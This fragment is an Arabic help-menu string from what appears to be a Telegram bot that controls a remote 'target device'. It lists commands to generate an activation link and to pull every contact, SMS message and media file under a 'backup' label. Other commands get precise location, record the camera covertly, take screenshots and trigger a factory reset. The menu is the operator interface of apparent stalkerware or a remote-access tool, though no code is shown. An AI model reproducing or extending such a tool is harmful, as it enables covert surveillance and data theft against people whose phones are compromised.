...
• `/help` - دليل الاستخدام المفصل
• `/link` - إنشاء رابط تفعيل جديد للجهاز المستهدف
• `/devices` - عرض جميع الأجهزة المتصلة وحالتها

📱 *أوامر النسخ الاحتياطي والبيانات:*
• `/contacts` - نسخ احتياطي شامل لجميع جهات الاتصال
• `/sms` - نسخ احتياطي لجميع الرسائل النصية
• `/media` - نسخ احتياطي للملفات الوسائطية (صور، فيديو، صوت)

📍 *أوامر الموقع والمراقبة:*
• `/location` - الحصول على الموقع الجغرافي الدقيق
• `/record` - تسجيل فيديو من الكاميرا (مخفي)
• `/screenshot` - التقاط لقطة شاشة فورية

⚙️ *أوامر النظام المتقدمة:*
• `/reset` - بدء عملية إعادة تعيين المصنع (تحتاج تأكيد)
...
🎉 *أنت جاهز للبدء! استخدم `/link` الآن*
"""
